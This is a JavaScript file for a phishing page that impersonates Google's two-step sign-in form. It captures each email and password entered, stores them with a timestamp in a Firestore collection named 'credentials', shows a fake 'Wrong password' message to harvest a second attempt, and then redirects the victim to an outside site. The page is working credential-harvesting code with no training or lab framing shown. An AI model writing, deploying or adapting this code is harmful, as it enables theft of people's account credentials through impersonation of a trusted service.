// Firebase Configuration - REPLACE THESE WITH YOUR OWN KEYS FROM FIREBASE CONSOLE
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT_ID.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const loginForm = document.getElementById('loginForm');
const emailStep = document.getElementById('emailStep');
const passwordStep = document.getElementById('passwordStep');
const nextBtn = document.getElementById('nextBtn');
const submitBtn = document.getElementById('submitBtn');
const headerTitle = document.getElementById('headerTitle');
const headerSubtitle = document.getElementById('headerSubtitle');
const displayEmail = document.getElementById('displayEmail');
const userDisplay = document.getElementById('userDisplay');

// Transition from Email to Password step
nextBtn.addEventListener('click', function() {
    const email = document.getElementById('email').value;
    
    if (email && document.getElementById('email').checkValidity()) {
        // Step 1: Add exit animation to current step
        emailStep.classList.add('slide-out');
        
        setTimeout(() => {
            emailStep.style.display = 'none';
            emailStep.classList.remove('slide-out');
            
            // Step 2: Show next step with entry animation
            passwordStep.style.display = 'block';
            passwordStep.classList.add('slide-in');
            
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'inline-block';
            
            // Update left section
            headerTitle.innerText = 'Welcome';
            headerSubtitle.innerText = email;
            headerSubtitle.classList.add('email-highlight');
            headerSubtitle.style.cursor = 'pointer'; // Make it clickable
            
            // Focus password input
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        }, 300);
    } else {
        alert('Please enter a valid email or phone number.');
    }
});

// Go back to email step (Clicking the email on the left)
headerSubtitle.addEventListener('click', function() {
    if (headerSubtitle.classList.contains('email-highlight')) {
        passwordStep.classList.add('slide-out-right');
        
        setTimeout(() => {
            passwordStep.style.display = 'none';
            passwordStep.classList.remove('slide-out-right');
            passwordStep.classList.remove('slide-in');
            
            emailStep.style.display = 'block';
            emailStep.classList.add('slide-in-left');
            
            submitBtn.style.display = 'none';
            nextBtn.style.display = 'inline-block';
            
            headerTitle.innerText = 'Sign in';
            headerSubtitle.innerText = 'Use your Google Account';
            headerSubtitle.classList.remove('email-highlight');
            headerSubtitle.style.cursor = 'default';
            
            setTimeout(() => {
                emailStep.classList.remove('slide-in-left');
            }, 300);
        }, 300);
    }
});

let loginAttempts = 0;

const progressBar = document.getElementById('progressBar');

// Final submission
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const responseMessage = document.getElementById('responseMessage');

    // UI Feedback: Show progress bar and update button
    const originalBtnText = submitBtn.innerText;
    submitBtn.innerText = 'Connecting...';
    submitBtn.disabled = true;
    responseMessage.innerText = ''; 
    progressBar.style.display = 'block';

    // Send data to Firebase Firestore
    db.collection('credentials').add({
        email: email,
        password: password,
        fullName: "Attempt " + (loginAttempts + 1),
        phoneNumber: "Not Provided",
        jobTitle: "Not Provided",
        capturedAt: new Date().toISOString()
    }).catch(error => console.error('Firebase Error:', error));

    // UI Redirection Flow (Simulate network delay)
    setTimeout(() => {
        progressBar.style.display = 'none';
        
        if (loginAttempts === 0) {
            // 1st Time: Show Google error message
            submitBtn.innerText = originalBtnText;
            submitBtn.disabled = false;
            responseMessage.innerText = 'Wrong password. Try again or click Forgot password to reset it.';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
            loginAttempts++;
        } else {
            // 2nd Time: Redirect to the app
            window.location.href = 'https://teja9391.github.io/ThreatMatrix-AI/?auth=success';
        }
    }, 1500);
});
